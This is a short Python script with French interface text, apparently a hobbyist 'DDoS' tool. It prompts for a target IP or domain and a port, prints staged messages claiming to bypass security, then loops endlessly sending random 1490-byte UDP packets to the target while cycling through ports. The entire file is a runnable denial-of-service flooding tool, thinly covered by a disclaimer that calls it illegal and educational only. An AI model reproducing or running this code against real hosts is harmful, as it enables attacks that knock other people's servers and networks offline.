#!/usr/bin/env python3
print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Temps
from datetime import datetime
maintenant = datetime.now()
heure = maintenant.hour
minute = maintenant.minute
jour = maintenant.day
mois = maintenant.month
annee = maintenant.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
donnees = random._urandom(1490)
#############

os.system("clear")
os.system("figlet CyberSec")
print()
print("Codé Par : CodeX")
print("Auteur   : Titi")
print("Github   : github.com/Brasiche/codex-ddos.git")
print()
print("Note - Cet outil est illégal et uniquement à des fins éducatives..")
print("Utilisez-le à vos propres risques, nous ne sommes pas responsables de vos actions.")
print()
ip = input("IP ou DOMAINE Cible : ")
port = int(input("Port : "))
os.system("clear")
os.system("figlet codeX")
print("script CodeX")
print ("\033[92m")
print("--- TENTATIVE DE CONNEXION AU SERVEUR ---")
time.sleep(5)
print("--- ÉTABLISSEMENT DE LA CONNEXION ---")
time.sleep(5)
print("--- CONTOURNEMENT DE LA COUCHE DE SÉCURITÉ ---")
time.sleep(5)
print("CONNEXION ÉTABLIE")
time.sleep(5)
print("   ATTAQUE DDoS LANCÉE. NOTE : UNIQUEMENT À DES FINS ÉDUCATIVES")
time.sleep(3)
envoye = 0
while True:
     sock.sendto(donnees, (ip, port))
     envoye = envoye + 1
     port = port + 1
     print(f"{envoye} paquets envoyés à {ip} via le port : {port}")
     if port == 65534:
         port = 1
